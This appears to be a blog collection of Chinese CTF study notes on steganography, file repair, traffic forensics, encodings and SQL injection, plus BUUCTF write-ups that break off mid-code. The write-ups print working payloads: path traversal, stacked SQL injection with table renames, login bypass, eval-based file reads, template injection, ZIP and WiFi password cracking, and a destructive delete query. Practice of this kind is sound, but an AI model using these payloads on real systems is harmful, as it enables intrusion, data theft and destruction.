通过修改像素中最低位的1bit来达到隐藏的效果 工具：stegsolve、zsteg、wbstego4、python脚本 1、Stegsolve.jar工具使用的时候这个是需要有顺序的，有可能是RGB有可能是GBR等等 2、zsteg工具 3、wbstego4解密通过lsb加密的图片 这个不止针对图片的最低有效位，还可能针对PDF的或者其他一些文件格式的最低有效位。它针对图片的最低有效位一般是针对 .bmp 的图片 这是wbstego4支持的4中文件格式 因为是bmp文件所以将jpg的文件可以使用画图等工具另存为bmp格式的文件，使用wbStego4进行选择打开。 文件解密后存放的另外一个位置，一直下一步就OK 可以看到保存到了这样一 个文件 打开后是乱码，然后会发现其中有flag，这只是这个工具的使用方法，当然也可以不用这个工具，直接使用zsteg就可以 4、python脚本将脚本放在kali中运行，将目标文件放在脚本同目录下，将脚本中的文件名修改为文件名，运行脚本即可。 如果不用脚本的话，需要将这个图片转为PNG格式使用Stegsolve查看图片的通道 5、TweakPNG​ TweakPNG是一款简单易用的PNG图像浏览工具，它允许查看和修改一些PNG图像文件的元信息存储。 使用场景：文件头正常却无法打开文件，利用TweakPNG修改CRC 例： 1、当PNG文件头正常但无法打开文件，可能是CRC校验出错，可以尝试通过TweakPNG打开PNG，会弹出校验错误的提示，这里显示CRC是fe1a5ab6，正确的是b0a7a9f1。打开010Editor搜索fe1a5ab6将其改为b0a7a9f1 例： 2、文件头正常却无法打开，利用TweakPNG修改CRC…. 又是CRC没有错误，但是图片的高度或者宽度发生了错误，需要通过CRC计算出正确的高度或者宽度 例： 使用tweakpng打开图片，查看crc 使用010Editor打开查看16进制，然后看看CRC是否相等，如果不同，进行修改，可以看到CRC是不同的，然后进行修改 可以直接替换将全部的cbd6df8a进行替换 查看图片，发现并没有生效，所以判断不是CRC造成的，然后将crc改回原来的值。因为不是crc造成的，所以这样就要计算它的高度和宽度了 可以看到python计算出的宽度和高度和图片本身是不同的，所以将A4改为F4 保存，再次进行查看图片。 6、Bftools​ Bftools用于解密图片信息。 使用场景：在Windows的cmd下，对加密过的图片文件进行解密。 格式： Btfools.exe decode braincopter 要解密的图片名称 -output 输出文件名 Bftools.exe run 上一步输出的文件。 ls 或者 dir 查看一下 在使用bftools.exe run 123.png 7、SilentEye​ silenteye是一款可以将文字或者文件隐藏到图片的解密工具 使用场景：windows下打开silentEye工具，对加密的图片进行解密 例： 1、使用silentEye程序打开目标图片，点击image —&gt; decode，点击decode，可以查看隐藏文件，点击保存即可 原始界面 打开文件 点击decode进行解密，再次点击decode会出现flag.txt，这是选择保存文件的目录，按照自己进行选择路径 查看保存路径，成功生成flag文件，打开里面你也有flag值 8.JPG图像加密1）Stegdetect 工具探测加密方式 ​ stegdetect程序主要分析JPEG文件。因此用stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息。 stegdetect xxx.jpg stegdetect -s 敏感度 xxx.jpgexi 2）Jphide ​ Jphide是基于最低有效位LSB的JPEG格式图像隐写算法。 例： ​ Stegdetect提示jphide加密时，可以用Jphs工具进行解密，打开jphswin.exe，使用open jpeg打开图片，点击seek，输入密码和确认密码，在弹出文件框中选择要保存的解密文件位置即可，结果保存成txt文件 3）Outguess ​ outguess一般用于解密文件信息 使用场景：stegdetect识别出来或者题目提示是outguess加密的图片 该工具需要编译使用：./configure &amp;&amp; make &amp;&amp; make install 格式：outguess -r 要解密的文件名 输出结果文件名 4）F5 ​ F5一般一用解密文件信息 使用场景：stegdetect识别出来或者题目提示是F5加密的图片 进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从CMD进入该目录 格式：java Exrtact 要解密的文件名 -p 密码 运行结束后，我们可以直接在目录下的output.txt中看到结果 9、二维码处理1、使用二维码扫描工具CQR.exe打开图片，找到内容没买过字段 2、如果二维码某个定位角被覆盖了，该工具有时候也可以自动识别，如果识别失败，需要使用PS或者画图工具将另外几个叫的定位符移动到相应的位置，补全二维码 3、如果某个二维码的定位点中间是白色的，可能被反色了，使用画图工具吧颜色反色回来在扫描即可。 压缩文件分析1、伪加密​ 如果压缩文件时加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过标识符来显示的，在每个文件的文件目录字段有以为专门表示了文件是否加密，将其设置为00表示改文件未加密，如果成功解压则表示文件为伪加密，如果解压出错说明文件为真加密。 使用场景：伪加密文件 操作方法：使用010Editor打开压缩文件，找到文件头第九第十个字符，将其修改为0000 1、使用010Editor打开文件搜索16进制504B0102，可以看到每个加密文件的文件头字段。 为什么是504B0102？ 因为504B0102是文件头 从50开始数，第九第十个字符为加密字段将其改为0000. 志位后如报错消失且正常解压，说明是伪加密。使用010Editor打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。 2、暴力破解​ 通常我们可以使用ARCHPR.exe工具来破解zip文件 使用场景：windows下加密过的zip文件 现在ARCHPR不支持高版本解密。选择 压缩包时会出现错误 ​ 1、攻击类型选择暴力破解，在范围位置根据提示选择暴力破解范围选项设置暴力破解包含的类型、开始于和结束于选项具体范围，如果没有定于则全范围暴力破解。点击打开选择要破解的文件，点击开始进行破解。建议使用1~9位的数字密码，以及系统自带的英文字典作为密码字典。 2、攻击类型选择掩码可以进行复杂的暴力破解，比如知道密码前三位是abc，后三位为数字，则在攻击类型选择掩码，再掩码处输入abc???，暴力范围选项选择所有数字，打开要破解的点击，点击破解。时???的部分会被我们选择的暴力破解范围中的字符代替。 3、明文攻击​ 明文攻击指知道加密的ZIP中部分文件的明文内容，利用这些内容推测出秘钥并解密ZIP文件的攻击方法，相比于暴力破解，这种方法在破解密码较为复杂的压缩包时效率更高。 使用场景：已知加密的zip部分文件明文内容 例：假设一个加密的压缩包中有两个文件readme.txt和flag.ext，其中flag.txt的内容使我们希望知道的内容，而我们拥有readme.txt的明文文件，使用上述两个文件即可进行明文攻击 操作： 1、将readme.txt的明文文件进行压缩，变成readme1.zip(即将明文文件不加密压缩后的文件)，加密的文件 选择要破解的文件，点击开始，破解成功后会获得密码。 有时不一定能破解出文件口令，但是能够找到加密秘钥等信息，可以直接将文件解密，点击确定保存解密后的文件即可。 使用该方法需要注意两个关键点： 1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致。 2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。 RAR文件格式有时候给出的RAR文件的头部各个字块会故意给错导致无法识别。 正常情况下是没有0x7A这个文件头的，所以这是错误的，那么我们就要修改0x7A将其改为74，0x74是文件头类型。 更改后显示了两个文件 流量取证流量包文件分析CTF比赛中，流量包的取证分析时另一项重要的考察方向。 通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。 总体把握 协议分级 端点统计 过滤筛选 过滤语法 Host，Protocol，contains，特征值 发现异常 特殊字符串 协议某字段 flag位于服务器中 数据提取 字符串取 文件提取 总体来说比赛中的流量分析可以概括一下三个方向 流量包修复 协议分析 数据提取 、 Wireshark工具使用Wireshark网络分析器进行流量分析 Wireshark的过滤器和过滤规则能够帮助我们迅速定位到要分析的报文。 Wireshark过滤器五元组 源IP地址 源端口 目的IP地址 目的端口 传输层协议 利用Wireshark本身强大的报文过滤器，帮助我们筛选出想要的报文。 常用的过滤命令： 1、过滤IP，如源IP或者目标x.x.x.x1ip.src eq x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr eq x.x.x.x 2、过滤端口1234567tcp.port eq 80 or udp.port eq 80tcp.dstport &#x3D;&#x3D; 80 只显示tcp协议的目标端口为80tcp.srcport &#x3D;&#x3D; 80 只显示tcp协议的源端口为80tcp.port &gt;&#x3D; 1 and tcp port &lt;&#x3D; 80 3、过滤协议1tcp&#x2F;udp&#x2F;arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip...... 4、过滤MAC1eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84过滤目标mac 5、包长度过滤1234567upd.length &#x3D;&#x3D; 26 这个长度是指udp本身固定长度8加上udp下面那块数据包之和。tcp.len &gt;&#x3D; 7 指的是ip数据包（tcp下面那块数据），不包括tcp本身ip.len &#x3D;&#x3D; 94 除了以太网头固定长度14，其他都算是ip.len，即从ip本身到最后frame.len &#x3D;&#x3D; 119 整个数据包长度，从eth开始到最后 6、Http模式过滤1234567891011121314151617http.request.method &#x3D;&#x3D; &quot;GET&quot;http.request.method &#x3D;&#x3D; &quot;POST&quot;http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo-edu.gif&quot;http contains &quot;GET&quot;http contains &quot;HTTP&#x2F;1.&quot;http.request.method &#x3D;&#x3D; &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;http contains &quot;flag&quot;http contains &quot;key&quot;tcp contains &quot;flag&quot; WireShark协议分析 根据数据包特征进行筛选 比如查看数据包的时候，有的数据包有某种特征，比如有http(80)，就可以筛选出这种特征出来。 右键 —&gt; 作为过滤器应用 —&gt; 选中 WireShark 流汇聚​ 在关注的http数据包或cp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容。 flag值就有可能存在TCP / HTTP流中 常见的HTTP流关键内容：1、HTML中直接包含重要信息。2、上传或下载文件内容，通常包含文件名，hash值相等关键信息，常用POST请求上传3、一句话木马，POST请求，内容包含eval，内容使用base64加密HTTP流： 也可以保存成另一种格式 例如： 打开事先准备好的题，找到对应的流，然后进行数据流追踪，筛选值里面就有可能有flag值 如果当流很多的时候可以使用数据流筛选里面的命令进行删选。 这个题里面就有一个base64加密得值，进行解密即可 WireShark 数据提取1、使用wireshark可以自动提取通过http传输的文件内容。 文件 —&gt; 导出对象 —&gt; HTTP 可以看到一个eval，说明这是以一个一句话木马存储的文件，第一段是base64加密的文件 89504E47是png的图片的文件头，将下面的16进制全部复制到一个文本，使用010Editor打开 2、wireshark手动提取文件内容。 点击想要的数据包，选定media type的位置 右键 —&gt; 导出分组字节流 或者 点击菜单栏 文件 —&gt; 导出分组字节流，快捷键Ctrl+H在弹出的框中将文件保存成二进制文件。 无线wifi流量包 aircrack-ng工具进行wifi密码破解 1、用aircrack-ng检查cap包：arcrack-ng xxx.cap 2、用aircrack-ng跑字典进行握手包破解：aircrack-ng xxx.cap -w pass.txt USB流量包文件分析USB流量USB流量也是流量分析题的考察点，一般考察的流量涉及键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。USB协议的数据部分在Leftover Capture Data域之中。 右键leftover capture data —&gt; 应用为例。 USB键盘流量抓取分析 Leftover Capture Data数据提取方式1： 文件 —&gt; 导出分组解析结构 —&gt; 为CSV，导出保存成一个.csv文件。 Leftover Capture Data数据提取方式 2： 使用wireshark提供的命令工具 tshark，可以将Leftover Capture Data数据单独复制出来。 tshark -r 流量包名 -T flelds -e usb.capdata &gt; 要保存的文件 USB鼠标流量抓取分析鼠标流量与键盘流量不同， 鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。鼠标数据包的数据长度为4个字节，第一个字节代表按键，当去oxoo时，代表没有按键；oxo1时，代表按左键，为oxo2时，代表当前按键为右键。 第二个字节代表左右偏移；当值为正时，代表右移多少像素。当值为负时，代表左移多少像素。同理，第三个字节代表上下偏移。 土脚本 if btn_flag需要自行调整0,1,2 第一张是没有将其导入一个文件，第二张 加上一个导出符 &gt; 文件名将信息保存到这个文档中 用gnuplot工具把坐标画出来。 输入gnuplot进入到gnuplot命令行 使用plot &quot;xy.txt&quot;命令根据这个文件坐标画一张图 可以看到这张图是倒过来的，只需要将其复制，旋转一下就可以。。 HTTPS流量包文件分析HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。 如果看到TLS和HTTPS(443)就可以判断出他是加密之后的 英文版：Preferences —&gt; Protocols —&gt; SSL —&gt; Edit RSA keys list 中文版：编辑 —&gt; 首选项 —&gt; Protocols —&gt; SSL —&gt; Edit RSA keys list 导入Key后出现原始的HTTP流量。右键 —&gt; 追踪流 —&gt; SSL流/HTTP流 密码学密码编码学（1）密码编码学是密码学的一个分支，研究与信息安全（例如：机密性、完整性、可鉴别性）有关的数学技术。 （2）密码编码学时包含数据变换的原 理、工具和方法的一门学科，这种数据变换的目的是为了隐藏数据的信息内容，阻止对数据的篡改以及防止未经认可使用数据。 （3）密码编码学是论述使明文变得不可懂的密文，以及把已加密的消息变换成可懂形式的艺术和技巧。 对称加密不对称加密 对称密码算法：解密秘钥和加密秘钥相同，或实质上等同，即从一个易于推出另一个。又称传统密码算法、密码秘钥算法或单秘钥算法。 DES、3DES、IDEA、AES 非对称密码算法：加密秘钥和解密秘钥不同，从一个很难推出另一个。又叫公钥密码算法。其中的加密秘钥可以公开，称为公开密钥，简称公钥；解密秘钥必须比保密，称为私人秘钥，简称私钥。 RSA、ECC、EIGamal 摘要算法​ 数据摘要算法是密码学算法中非常重要的一个分支，他通过对所有数据提取指纹信息以实现数据签名、数据完整性校验等功能，由于其不可逆性，有时候会被用作敏感信息的加密。数据摘要算法也被称为哈希（Hash）算法、散列算法，常见的摘要算法有MD5和SHA ​ 在互联网上进行大文件传输时，都要得用MD5算法产生一个与文件匹配的、存储MD5值得文本文件（后缀名为.md5或.mdsum），这样接受者在接收到文件后，就可以利用与SFV类似的方法来检查文件完整性，对大多数大型软件公司或开源组织都是以这种方式来校验数据完整性，而且部分操作系统也使用此算法来对用户密码进行加密，另外，他也是目前计算机犯罪中数据取证最常用的算法。 ​ SHA中SHA1的应用范围较为广泛，主要用于CA个数字证书中，另外在互联网中流行的BT软件中，也是使用SHA1来进行文件校验的，由于SHA系列算法的数据摘要长度较长，因此其运算速度与MD5相比，也相对较慢。 ASCII编码​ ASCII码使用指定的7位或8位二进制数组来表示128或256种可能的字符。标准ASCII码也叫基础ASCII码，使用7位二进制数（剩下的1位二进制为0）来表示所有的大写和小写字母，数字0到9、标点符号，以及在美式英语中使用的特殊控制字符 如果要进行ASCII吗转换，直接在百度搜索ASCII在线转换就可以 http://ctf.ssleye.com/这里面有各种 转换工具 或者下载一个 小葵多功能转换工具。 Base64编码​ Base64顾名思义就是用64个可显示字符表示所有ASC字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8为字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用’ =’，因此编码后输出的文本末尾可能出现1或2个’ =’ 解密地址可以百度搜索在线工具，活着使用小葵，或者使用上面的网址里面的工具，都可以。 URL编码​ url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”，比如“\\”，它的ascii码是92，92的十六进制是5c，所以“\\”的url编码就是%5c。 解码地址，百度搜在线解密 Unicode编码​ Unicode码扩展自ASCII字元集。在严格的ASCII中，每个字元用7位元表示，或者电脑上普遍使用的没字元有8位元宽；而Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能与电脑通讯的字元、象形文字和其他符号。 特点：密文中有多个\\uxxx JS混淆​ 有些时候开发者为了保护劳动成果可以通过对javascript的变量名称和过程名称进行编码，从而起到混淆JS代码的作用，通常使用eval函数进行混淆处理，该函数可以计算字符串，并执行其中的JS代码。 ​ 如：对&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;进行16进制转换，然后使用eval函数进行读取 123&lt;script&gt; eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29\\x3b&quot;);&lt;&#x2F;script&gt; 特点：通常在JS脚本里使用eval与function函数进行混淆 网络基础简单过一下 网络起源 家庭网络 企业网路基本构架 网络的组成和结构终端设备：PC、iphone、ATM等等。 网络互连设备：集线器、交换机、路由器、防火墙、IDS、IPS、ICG、AP、基站 用于连接设备的链接 / 介质：：同轴电缆，双绞线，光纤，无线 通信模型介绍协议的必要性 OSI七层模型 分层模型-TCP/IP标准模型与对等模型4层模型和5层模型，将7层模型进行合并。 应用层：APP产生的数据 表示层：格式转换 会话层：区分不同会话 传输层：端到端连接；通过端口号识别上层协议；比如443识别https；80-http； 端口号：小于1023的是知名端口，一些应用层协议都是默认为知名端口 网络层：IP寻址 数据链路层：MAC寻址 —-物理地址（每台设备都有唯一的地址） 物理层：决定数据在不同介质的传输方式 报文五元组： 应用层：协议 传输层：源端口、目的端口 网络层：源IP、目的IP web基础+sql注入WEB应用的基础架构 HTTP协议 HTTP请求报文 HTTP请求报文—请求行 HTTP请求报文—请求头 HTTP响应报文 HTTP响应报文——状态行 信息收集类解题 例题1，解题步骤这是简单的信息收集 前端代码类解题 例： 解析：F12，找到maxlength修改字符最大长度 HTTP协议类 例： 页面返回你是来自谷歌吗？ 这里一看就知道要是用referer来伪造访问网址，只需要是用burp抓包，然后添加referer就可以，然后将谷歌网址输入即可 sql注入原理数据库系统的基本概念 关系型数据库系统特点 结构化查询语言sql SELECT语句——基本查询 SELECT语句——AND和OR运算 SQL注入攻击 经典的万能密码 使用正常语句查询，返回错误 使用万能密码进行查询 成功返回， 原理：or和and都有的时候先判断and也就是”1” and “123456”判断，这肯定是错的，错的就等于0 俺就判断 “1”=”0”，因为1不等于0所以也是错了，username=”admin”是正确的所以正确。 因为是三种万能密码，所以还有两种，原理相同 可以使用工具来进行扫描，sqlmap，椰树都可以","categories":[],"tags":[]},{"title":"BUUCTF题","slug":"BUUCTF题","date":"2020-07-25T01:17:12.594Z","updated":"2020-07-05T02:39:35.712Z","comments":true,"path":"2020/07/25/BUUCTF题/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/BUUCTF%E9%A2%98/","excerpt":"","text":"[HCTF 2018]WarmUp打开页面 查看源码看看 访问这个文件 查看源码 而且观察顶部代码发现有一个hint.php的文件，查看一下 告诉我们flag在ffffllllaaaagggg中。 回到source.php代码 首先看下面部分: 12345678910111213# 字符不能为空if (! empty($_REQUEST[&#39;file&#39;])# 提交变成字符串形式 &amp;&amp; is_string($_REQUEST[&#39;file&#39;])# 通过checkFile校验 &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) &#123; include $_REQUEST[&#39;file&#39;]; # 包含$_REQUEST[&#39;file&#39;]文件 exit; &#125; else &#123; # 打印滑稽表情 echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;; &#125; if语句传入file变量满足三个条件 非空 类型为字符串 能够通过checkFile()函数校验 只有同时满足这三个条件才能打印file中的文件，否则打印滑稽表情 查看checkFile()函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 高光显示highlight_file(__FILE__);# 定义一个emmm的类 class emmm &#123;# 将传入的参数赋值给$page public static function checkFile(&amp;$page) &#123; # 声明$whitelist白名单数组 $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;]; # 若$page不存在或者不是字符串 if (! isset($page) || !is_string($page)) &#123; # 打印you can&#39;t see it echo &quot;you can&#39;t see it&quot;; return false; &#125; # 判断变量$page存在$whitelist数组中 if (in_array($page, $whitelist)) &#123; # 返回true return true; &#125; # 截取$page中&#39;?&#39;前部分，若无则取整个$page $_page &#x3D; mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); # 判断截取完的$page是否在在白名单中 if (in_array($_page, $whitelist)) &#123; # 在返回true return true; &#125; # url解码 $_page &#x3D; urldecode($page); # 在进行截取...... $_page &#x3D; mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); # 判断截取完的$page是否在在白名单中 if (in_array($_page, $whitelist)) &#123; # 在返回true return true; &#125; # 否则返回false echo &quot;you can&#39;t see it&quot;; return false; &#125; &#125; 可以看到函数代码中有四个if语句 第一个if语句对变量进行检验，要求$page为字符串，否则返回false 第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true 第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true 第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true 若以上四个if语句均未返回值，则返回false 有三个if语句可以返回true，第二个语句直接判断$page，不可用 第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用 第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url： http://***:***/source.php/%253f../ffffllllaaaagggg 无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在 http://***:***/source.php/%253f../../../../../ffffllllaaaagggg成功回显flag [强网杯 2019]随便注1堆叠注入堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句。 堆叠原理在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。 例：执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。 mysql&gt; select * from users where id =1;delete from users; 查看页面 使用 or 可以把表中所有数据都查询出来，但是并没有我们需要的flag 使用order by查看字段数，当order by 2的时候返回正常，order by 3就出错了，只有两个字段， 这时候用union select进行联合查询，返回一个正则过滤规则，可以看到几乎所有的字段都过滤了，所以这里用堆叠注入。 查看当前数据库，可以看到成功了，存在堆叠注入， 11&#39;;show databases;# 我们在用show tables来查询一下能不能查出表，有两张表，分别看看两张表有什么字段 使用一下命令来查看 10&#39;;show columns from &#96;words&#96; ;# 并没有flag，查看另一张表，可以看到有flag 10’; show columns from &#96;1919810931114514&#96;;# 注意：在windows系统下，反单引号(`)是数据库、表、索引、列和别名用的引用符 如： 1mysql&gt; SELECT * FROM &#96;table&#96; WHERE &#96;id&#96; &#x3D; &#39;123&#39; ; 其中1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关。 查看一下words表结构，发现有id和data两个字段 11&#39;;desc words;# 因为这里有两张表，会县内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢 内部查询语句类似 : select id, data from word where id = 因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag payload: 11&#39;;rename table &#96;words&#96; to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);show table;# [SUCTF 2019]EasySQL打开界面 试了一下有三种显示 一共有以上三种显示 可以使用堆叠注入 121;show databases;1;show tables; 可以看到有一个Flag表，测试发现from flag都被过滤不能直接读到flag。想了很久想不到 看别人wp了~，听说比赛的时候原理泄漏了 11;select $_GET[&#39;query&#39;] || flag from flag 这tm根本想不到 不过由于没有过滤 * 出现了一个意外解 1*,1 [极客大挑战 2019]EasySQL查看页面 因为题目说用SQL注入，所以就可以明确了。 按照正常流程来一波，先在用户名处随便输入内容，加上一个单引号( ‘ ) 登录，报错了，说明可以注入 返回，在引号后面加一个井号（#），页面返回正确 使用order by 查看字段数，这里当order by 3的时候页面返回正常，其他发返回错误 使用union select 1,2,3#来查看注入点 没想到flag直接出来了 还有一种方法使用万能密码登录 前面的123不一定非得是123，自己喜欢输入什么就输入什么 123&#39; or &#39;1&#39;=&#39;1 也是成功的返回了flag [护网杯 2018]easy_tornado打开网址 有三个文件 挨个打开 1http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;5b43f104291dd7435e0dcd18c4ed9d8a URL： 1http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;67ac43a877052aa89c40b36ec5bc157e URL： 1http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;04b56c16ce59e7b360eed3e1638e142c 有这三个内容， 发现render函数：将文件内容显示在网页上 render函数介绍 测试之后发现还有一个error界面。格式为/error?msg=error 联想render函数，修改msg的参数 因为可以看到，nsg很后面跟着Error，也跟着打印出来了，尝试一下将其改为1，或者其他，看看能否打印 打印了。 尝试一下能否进行运算， 传递error?msg=2，页面输出2 传递error?msg=4，页面输出ORZ（除和减操作符也是返回ORZ，说明操作符被过滤了）。 仿照url格式，我们还需要知道filehash值，filehash是一个md5后的值，联想第三个界面 md5(cookie_secret+md5(filename))，我们还需要知道cookie_secret，那么tornado中的cookie通过模板注入要怎么拿到呢？用的就是handler.settings对象 其中cookie_secret是在Tornado框架的附属文件handler.settings中 这样就可以构造URL： 复制这个cookue_secret，这样我们需要写一个PHP或者python都行，来计算filehash 12345&lt;?php $cookie&#x3D;&#39;448b372f-9031-488e-83f3-35ce014c3baa&#39;; $flag&#x3D;&#39;&#x2F;fllllllllllllag&#39;; echo md5($cookie.md5($flag));?&gt; 复制输出的MD5值 在URL中添加 将filename改为/fllllllllllllag，filehash改为输出的MD5值 Payload： 1http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;2b0f561c7b112c2c8b665bfb2048405b [极客大挑战 2019]Havefun查看页面 按F12查看一下源码 这里注释了一段代码，意思就是当cat等于dog时候输出 这里我们查看在url中构造一下，成功返回了flag [RoarCTF 2019]Easy Calc看一下源码 这里面有一个calc.php，访问一下试试 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);# 判断是否为空if(!isset($_GET[&#39;num&#39;]))&#123; show_source(__FILE__);&#125;else&#123;# 不为空执行以下代码 $str &#x3D; $_GET[&#39;num&#39;];# 黑名单 $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;,&#39;\\$&#39;,&#39;\\\\&#39;,&#39;\\^&#39;]; # 遍历数组 foreach ($blacklist as $blackitem) &#123;# 正则表达式对字符串进行搜索 if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123; # 成功执行die die(&quot;what are you want to do?&quot;); &#125; &#125; # 否则 输出str变量 eval(&#39;echo &#39;.$str.&#39;;&#39;);&#125;?&gt; 扫一下根目录，发现有一个flagg文件 这里? num 中间要空格开，不能连起来写。 解析：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。 1? num&#x3D;1;var_dump(scandir(chr(47))) 查看flagg 解析：因为直接输入/flagg是不行的，所以转成ascii码 成功返回flag 1? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) [HCTF 2018]admin查看页面 右上角有一个选择框查看内容 有一个登录和注册 随便注册一个登录试试 发现登录上去后有post、change password、logout功能。 然后在index页面源码发现提示，you are not admin，估计题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。 点击change password，于是跳到change password页面，看看有没有进一步的发现，也是在网页源代码处发现了提示，这个提示直接把网站项目的github地址给了出来。 复制网址打开看看 是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码 1234@app.route(&#39;&#x2F;&#39;)@app.route(&#39;&#x2F;index&#39;)def index(): return render_template(&#39;index.html&#39;, title &#x3D; &#39;hctf&#39;) 发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码 1234567891011&#123;% include(&#39;header.html&#39;) %&#125;&#123;% if current_user.is_authenticated %&#125;&lt;h1 class&#x3D;&quot;nav&quot;&gt;Hello &#123;&#123; session[&#39;name&#39;] &#125;&#125;&lt;&#x2F;h1&gt;&#123;% endif %&#125;&#123;% if current_user.is_authenticated and session[&#39;name&#39;] &#x3D;&#x3D; &#39;admin&#39; %&#125;&lt;h1 class&#x3D;&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;&#x2F;h1&gt;&#123;% endif %&#125;&lt;!-- you are not admin --&gt;&lt;h1 class&#x3D;&quot;nav&quot;&gt;Welcome to hctf&lt;&#x2F;h1&gt;&#123;% include(&#39;footer.html&#39;) %&#125; 发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。route.py部分函数代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758@app.route(&#39;&#x2F;register&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])def register(): if current_user.is_authenticated: return redirect(url_for(&#39;index&#39;)) form &#x3D; RegisterForm() if request.method &#x3D;&#x3D; &#39;POST&#39;: name &#x3D; strlower(form.username.data) if session.get(&#39;image&#39;).lower() !&#x3D; form.verify_code.data.lower(): flash(&#39;Wrong verify code.&#39;) return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form&#x3D;form) if User.query.filter_by(username &#x3D; name).first(): flash(&#39;The username has been registered&#39;) return redirect(url_for(&#39;register&#39;)) user &#x3D; User(username&#x3D;name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#39;register successful&#39;) return redirect(url_for(&#39;login&#39;)) return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form &#x3D; form)@app.route(&#39;&#x2F;login&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])def login(): if current_user.is_authenticated: return redirect(url_for(&#39;index&#39;)) form &#x3D; LoginForm() if request.method &#x3D;&#x3D; &#39;POST&#39;: name &#x3D; 